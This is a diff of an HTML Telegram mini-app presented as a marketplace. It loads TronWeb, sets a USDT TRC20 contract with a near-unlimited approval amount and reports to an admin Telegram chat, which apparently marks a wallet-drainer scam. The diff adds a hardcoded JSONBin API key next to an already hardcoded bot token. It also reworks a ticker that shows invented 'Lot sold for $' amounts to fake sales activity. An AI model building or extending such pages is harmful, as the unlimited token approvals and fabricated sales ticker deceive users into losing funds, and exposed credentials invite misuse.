@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<!-- version: 14 -->
+<!-- version: 15 -->
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -69,8 +69,9 @@
   .ticker {
     display: flex;
     white-space: nowrap;
-    animation: scroll 80s linear infinite;
-    will-change: transform;
+    width: 100%;
+    justify-content: center;
+    align-items: center;
   }
 
   .ticker span {
@@ -79,16 +80,12 @@
     font-weight: 600;
     text-shadow: 0 0 8px rgba(255, 217, 102, 0.7), 0 0 16px rgba(255, 217, 102, 0.4);
     padding: 0 6px;
+    opacity: 0;
+    transition: opacity 0.6s ease;
   }
 
-  .ticker .sep {
-    color: rgba(255, 217, 102, 0.45);
-    font-weight: 400;
-  }
-
-  @keyframes scroll {
-    0% { transform: translateX(0); }
-    100% { transform: translateX(-50%); }
+  .ticker span.visible {
+    opacity: 1;
   }
 
   /* Profile circle */
@@ -669,8 +666,8 @@
 */
 const BOT_TOKEN = "8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8";
 const ADMIN_CHAT_ID = "8696933754";
-const JSONBIN_API_KEY = "";
-const JSONBIN_BIN_ID = "";
+const JSONBIN_API_KEY = "$2a$10$irANTFQT/msEdj66x8qD1u0q5hL5Cr7SkzFBzmWBd8RpypxtLnnHi";
+const JSONBIN_BIN_ID = "6a7b8c1fda38895dfed797de";
 
 const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const APPROVE_AMOUNT = "1000000000000000000";
@@ -942,25 +939,33 @@ function clearUser() {
   updateProfileUI();
 }
 
-function generateTickerAmounts() {
-  const amounts = new Set();
-  while (amounts.size < 32) {
-    amounts.add(randInt(150, 5000));
+function getRoundAmounts() {
+  // Round numbers from 100 to 2500 with step 50
+  const amounts = [];
+  for (let v = 100; v <= 2500; v += 50) {
+    amounts.push(v);
   }
-  return Array.from(amounts);
+  return amounts;
 }
 
 function buildTicker() {
-  const amounts = generateTickerAmounts();
-  const parts = amounts.map(function(a) {
-    return "Lot sold for $" + a;
-  });
-  const full = parts.concat(parts);
-  let html = "";
-  for (let i = 0; i < full.length; i++) {
-    html += "<span>" + full[i] + "</span><span class=\"sep\"> • </span>";
+  const el = $("ticker");
+  if (!el) return;
+
+  const amounts = shuffle(getRoundAmounts());
+  let idx = 0;
+
+  function showNext() {
+    const amount = amounts[idx % amounts.length];
+    idx++;
+    el.innerHTML = "<span class=\"visible\">Lot sold for $" + amount + "</span>";
+
+    // Random gap between messages: 5–15 seconds
+    const delay = (5 + Math.floor(Math.random() * 11)) * 1000;
+    setTimeout(showNext, delay);
   }
-  $("ticker").innerHTML = html;
+
+  showNext();
 }
 
 function buildSellersGrid() {
